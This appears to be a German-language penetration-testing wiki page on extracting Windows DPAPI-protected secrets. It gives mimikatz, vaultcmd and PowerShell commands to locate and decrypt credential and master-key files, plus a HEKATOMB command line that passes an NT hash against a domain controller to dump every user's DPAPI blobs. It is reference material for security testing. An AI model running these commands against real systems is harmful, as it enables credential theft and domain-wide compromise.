# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle genutzt werden. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers abgeleitet ist oder, bei der Systemverschlüsselung, aus den Authentifizierungsgeheimnissen der Domäne des Systems, wodurch die Notwendigkeit entfällt, dass Entwickler den Schutz des Verschlüsselungsschlüssels selbst verwalten müssen.

### Geschützte Daten durch DPAPI

Zu den persönlichen Daten, die durch DPAPI geschützt sind, gehören:

- Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüssel
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und mehr

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Anmeldeinformationen Dateien

Die **geschützten Anmeldeinformationsdateien** könnten sich befinden in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Holen Sie sich Anmeldeinformationen mit mimikatz `dpapi::cred`, in der Antwort finden Sie interessante Informationen wie die verschlüsselten Daten und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Sie können das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Die DPAPI-Schlüssel, die zum Verschlüsseln der RSA-Schlüssel des Benutzers verwendet werden, sind im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei {SID} der [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **dieses Benutzers** ist. **Der DPAPI-Schlüssel wird in derselben Datei wie der Master-Schlüssel gespeichert, der die privaten Schlüssel der Benutzer schützt**. Er besteht normalerweise aus 64 Bytes zufälligen Daten. (Beachten Sie, dass dieses Verzeichnis geschützt ist, sodass Sie es nicht mit `dir` von der cmd auflisten können, aber Sie können es von PS aus auflisten).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dies ist, wie eine Reihe von Master Keys eines Benutzers aussehen wird:

![](<../../images/image (1121).png>)

Normalerweise **ist jeder Master Key ein verschlüsselter symmetrischer Schlüssel, der andere Inhalte entschlüsseln kann**. Daher ist es **interessant, den **verschlüsselten Master Key** zu **extrahieren**, um später den **anderen Inhalt**, der damit verschlüsselt wurde, zu **entschlüsseln**.

### Master Key extrahieren & entschlüsseln

Überprüfen Sie den Beitrag [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) für ein Beispiel, wie man den Master Key extrahiert und entschlüsselt.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) ist ein C#-Port einiger DPAPI-Funktionalitäten aus [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) Projekt.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis und die Extraktion des Backup-Schlüssels des Domänencontrollers über RPC automatisiert. Das Skript wird dann die IP-Adressen aller Computer auflösen und einen smbclient auf allen Computern ausführen, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Domänen-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus der LDAP-Computerliste extrahierten Liste können Sie jedes Subnetz finden, selbst wenn Sie sie nicht kannten!

"Weil Domänen-Admin-Rechte nicht genug sind. Hacken Sie sie alle."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Geheimnisse dumpen.

## Referenzen

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
